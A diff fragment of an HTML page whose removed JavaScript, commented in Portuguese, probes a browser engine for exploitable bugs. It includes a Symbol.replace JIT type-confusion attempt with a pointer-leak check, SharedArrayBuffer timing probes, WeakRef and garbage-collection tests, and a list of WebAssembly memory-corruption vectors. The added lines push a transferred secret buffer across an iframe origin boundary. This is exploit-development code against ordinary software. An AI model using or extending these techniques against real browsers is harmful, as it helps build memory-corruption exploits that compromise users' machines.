-    // D2: forced valueOf inline
-    info('\nD2: Forçar valueOf inline no JIT...');
-    var valueOfCalls = 0;
-    var victimWithValueOf = {
-      magic: 0xDEADBEEF,
-      // valueOf que retorna valores controlados para que possamos
-      // fazer engenharia reversa do que o JIT faz com o objeto
-      valueOf: function() {
-        valueOfCalls++;
-        // Retornar valor único que não é um double normal
-        // Baseado nos testes anteriores o JIT chama valueOf normalmente
-        return 0xDEADBEEF; // 3735928559
-      }
-    };
-
-    phase[0] = 'attack';
-    var evilPattern2 = { [Symbol.replace]: function(s) {
-      if(phase[0]==='warmup') return s;
-      return { toString:function(){return s;}, valueOf:function(){return s;},
-               length: victimWithValueOf };
-    }};
-    function getLen2(s) { return s.replace(evilPattern2,'').length; }
-    phase[0] = 'warmup';
-    for(var w2=0;w2<50000;w2++) getLen2('probe');
-    phase[0] = 'attack';
-    valueOfCalls = 0;
-
-    var r2 = getLen2('probe');
-    info('getLen2 com victimWithValueOf: ' + r2 + ' typeof=' + typeof r2);
-    info('valueOfCalls: ' + valueOfCalls);
-
-    if(typeof r2 === 'number') {
-      info('bits: ' + f64bits(r2));
-      if(looksLikePtr(r2)) {
-        alerta('BITS DE PONTEIRO via valueOf!\nbits=' + f64bits(r2));
-      } else if(r2 === 0xDEADBEEF || r2 === 3735928559) {
-        info('Retornou o valor do valueOf() = 0xDEADBEEF (' + r2 + ')');
-        info('O JIT chamou valueOf() e retornou o número — não há leak de ponteiro aqui.');
-      }
-    } else if(typeof r2 === 'object' && r2 === victimWithValueOf) {
-      info('Retornou victimWithValueOf diretamente (sem chamar valueOf).');
-      info('valueOfCalls=' + valueOfCalls + ' — confirmado: objeto passado sem valueOf');
-    }
-
-    sep();
-    // D3: SharedArrayBuffer + Atomics para detectar o endereço via racing
-    info('\nD3: Verificando suporte a SharedArrayBuffer...');
-    if(typeof SharedArrayBuffer !== 'undefined') {
-      info('SharedArrayBuffer disponível! Tentando Atomics timing...');
-      try {
-        var sab = new SharedArrayBuffer(64);
-        var sabView = new Int32Array(sab);
-        sabView[0] = 0;
-        info('SAB criado. Atomics.load: ' + Atomics.load(sabView, 0));
-        alerta('SharedArrayBuffer DISPONÍVEL!\n' +
-               'Atomics podem ser usados para timing attacks e construção de primitivos sync.\n' +
-               'Isso abre uma nova superfície de ataque não explorada!');
-      } catch(e) {
-        info('SAB criou mas Atomics falhou: ' + e.message);
-      }
-    } else {
-      info('SharedArrayBuffer não disponível neste contexto.');
-    }
-
-    // D4: WeakRef — o motor armazena referência fraca; GC revela se objeto está vivo
-    info('\nD4: WeakRef disponível?');
-    if(typeof WeakRef !== 'undefined') {
-      var wr = new WeakRef(victim);
-      info('WeakRef(victim) criado.');
-      var deref = wr.deref();
-      info('wr.deref() === victim: ' + (deref === victim));
-      forceGC();
-      var deref2 = wr.deref();
-      info('wr.deref() após GC: ' + (deref2 ? 'objeto ainda vivo' : 'undefined (coletado)'));
-      if(deref2) {
-        info('victim.magic após GC: 0x' + deref2.magic.toString(16));
-      }
-    } else {
-      info('WeakRef não disponível.');
-    }
-  } else {
-    info('confusedLen não é objeto neste contexto.');
-  }
-
-  sep();
-  // Último teste: verificar se wasm está disponível (abre MUITAS novas superfícies)
-  info('\nVerificando disponibilidade de WebAssembly...');
-  if(typeof WebAssembly !== 'undefined') {
-    alerta('WEBASSEMBLY DISPONÍVEL!\n' +
-           'Wasm abre novos vetores de ataque:\n' +
-           '  - wasm memory.grow() para overlap com JS heap\n' +
-           '  - wasm table.get() type confusion\n' +
-           '  - wasm↔JS boundary type confusion\n' +
-           '  - wasm linear memory como primitive read/write buffer\n' +
-           'Recomendar: criar TEST 48 focado em WebAssembly!');
-
-    // Verificar se podemos compilar wasm básico
-    try {
-      // Wasm mínimo: módulo com função que retorna 42
-      var wasmBytes = new Uint8Array([
-        0x00,0x61,0x73,0x6d, // magic: \0asm
-        0x01,0x00,0x00,0x00, // version: 1
-        0x01,0x05,0x01,0x60,0x00,0x01,0x7f, // type section: () -> i32
-        0x03,0x02,0x01,0x00, // function section
-        0x07,0x07,0x01,0x03,0x67,0x65,0x74,0x00,0x00, // export "get"
-        0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b // code: i32.const 42; end
-      ]);
-      WebAssembly.compile(wasmBytes).then(function(mod) {
-        return WebAssembly.instantiate(mod);
-      }).then(function(inst) {
-        var val = inst.exports.get();
-        alerta('WASM COMPILADO E EXECUTADO!\ninst.exports.get() = ' + val + '\n' +
-               'WebAssembly funcional — exploits via wasm são viáveis!');
-      }).catch(function(e) {
-        info('wasm compile/instantiate falhou: ' + e.message);
-      });
-    } catch(e) {
-      info('WebAssembly.compile() síncrono falhou: ' + e.message);
-    }
-  } else {
-    info('WebAssembly não disponível.');
-    info('Próxima opção: testar worker threads e MessageChannel para primitivos de timing.');
-  }
-}
-</script>
+                info("Enviando postMessage para o Iframe (cross-origin boundary)...");
+                try {
+                    iframe.contentWindow.postMessage(cyclicObj, '*', [secretBuf]);
+                    info("Enviado. Buffer local byteLength = " + secretBuf.byteLength);
+                } catch(e) {
+                    warn("postMessage falhou na fronteira de origem: " + e.message);
+                }
+            };
+        }
+    </script>
 </body>
 </html>
-
